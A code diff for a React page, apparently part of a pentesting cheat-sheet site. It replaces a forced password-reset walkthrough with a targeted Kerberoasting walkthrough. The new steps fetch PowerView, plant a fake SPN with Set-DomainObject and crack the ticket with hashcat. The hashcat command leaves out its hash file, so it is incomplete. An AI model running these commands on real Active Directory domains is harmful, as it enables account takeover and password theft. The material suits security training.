@@ -8,13 +8,12 @@ import {
 import Link from "next/link";
 import SyntaxHighlighter from "react-syntax-highlighter";
 import ExpandMoreIcon from "@mui/icons-material/ExpandMore";
-import Image from "next/image";
 
 interface IProps {
   title: string;
 }
 
-const ForceChangePassword = ({ title }: IProps) => {
+const GenericWriteOnUser = ({ title }: IProps) => {
   return (
     <>
       {" "}
@@ -36,44 +35,49 @@ const ForceChangePassword = ({ title }: IProps) => {
           >
             <Typography variant="h6">Description</Typography>
             <Typography>
-              The members of the compromised group have the capability to change
-              the user's password in the other group without knowing that user's
-              current password.
+              Generic Write access grants you the ability to write to any
+              non-protected attribute on the target object, including “members”
+              for a group, and “serviceprincipalnames” for a user. With
+              GnericWrite over a user, we can perform a targeted kerberoasting
+              attack.
             </Typography>
-            <Image
-              src="/ForceChangePassword.png"
-              width={575}
-              height={154}
-              priority={true}
-            />
             <Box sx={{ m: 4 }} />
             <Typography variant="h6">Step 1</Typography>
             <Typography>
-              If you have ForceChangePassword over a group then you can get a
-              list of user's in that group and choose which user we want to
-              change the password for. If you have ForceChangePassword over a
-              user, then skip to step 2.
+              Download PowerView.ps1 and transfer it to the victim machine.
             </Typography>
             <SyntaxHighlighter className="syntax" language="bash">
-              {'Get-ADGroupMember -Identity "OTHER_GROUP_NAME"'}
+              {
+                "wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1"
+              }
             </SyntaxHighlighter>
             <Box sx={{ m: 4 }} />
             <Typography variant="h6">Step 2</Typography>
-            <Typography>Create a new password variable.</Typography>
+            <Typography>Import the PowerView.ps1 module.</Typography>
             <SyntaxHighlighter className="syntax" language="bash">
-              {
-                '$Password = ConvertTo-SecureString "Password123!" -AsPlainText -Force'
-              }
+              {"Import-Module .\\PowerView.ps1"}
             </SyntaxHighlighter>
             <Box sx={{ m: 4 }} />
             <Typography variant="h6">Step 3</Typography>
             <Typography>
-              Change one of the user's passwords to the password you created.
+              Modify the account's servicePrincipalName attribute to create a
+              fake SPN that we can Kerberoast to obtain the TGS ticket and
+              (hopefully) crack the hash offline using Hashcat or John the
+              Ripper.
             </Typography>
             <SyntaxHighlighter className="syntax" language="bash">
               {
-                'Set-ADAccountPassword -Identity "ACCOUNT" -Reset -NewPassword $Password'
+                "Set-DomainObject -Identity {USER_WE_WANT} -SET @{serviceprincipalname='nonexistent/BLAHBLAH'} -Verbose"
               }
+            </SyntaxHighlighter>
+            <Box sx={{ m: 4 }} />
+            <Typography variant="h6">Step 4</Typography>
+            <Typography>Kerberoast the ticket for the user we want.</Typography>
+            <Box sx={{ m: 4 }} />
+            <Typography variant="h6">Step 5</Typography>
+            <Typography>Crack the password.</Typography>
+            <SyntaxHighlighter className="syntax" language="bash">
+              {"hashcat -m 13100 /usr/share/wordlists/rockyou.txt --force"}
             </SyntaxHighlighter>
           </Typography>
         </AccordionDetails>
@@ -82,4 +86,4 @@ const ForceChangePassword = ({ title }: IProps) => {
   );
 };
 
-export default ForceChangePassword;
+export default GenericWriteOnUser;
